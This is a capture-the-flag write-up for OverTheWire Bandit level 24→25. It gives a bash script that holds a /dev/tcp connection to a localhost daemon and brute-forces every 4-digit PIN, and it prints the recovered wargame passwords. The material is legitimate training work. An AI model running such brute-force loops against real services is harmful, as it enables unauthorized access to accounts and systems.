## Bandit Level 24 → Level 25

### Goal
A daemon is listening on port 30002.  
It returns the password for bandit25 if provided with:
- the correct password for bandit24
- the correct 4-digit numeric pincode

The pincode must be brute-forced.

---

### Approach
- Reuse a single TCP connection to the daemon
- Ignore the initial banner message
- Bruteforce all PINs from 0000 to 9999
- Detect success when the response does not start with `Wrong`

---

### Solution
```bash
#!/bin/bash

PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

# Open persistent TCP connection
exec 3<>/dev/tcp/localhost/30002

# Read and discard banner
read -r _ <&3

for pin in $(seq -w 0000 9999); do
    echo "$PASSWORD $pin" >&3
    read -r response <&3

    if [[ "$response" != Wrong* ]]; then
        echo "[+] PIN FOUND: $pin"
        echo "$response"
        break
    fi
done

# Close connection
exec 3>&-
```

---

### Result

[+] PIN FOUND: 1667
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

---

### What I Learned
- How to brute-force a TCP service efficiently
- How to reuse a single network connection in Bash
- How to communicate with daemons using /dev/tcp
- How to parse and filter network responses correctly
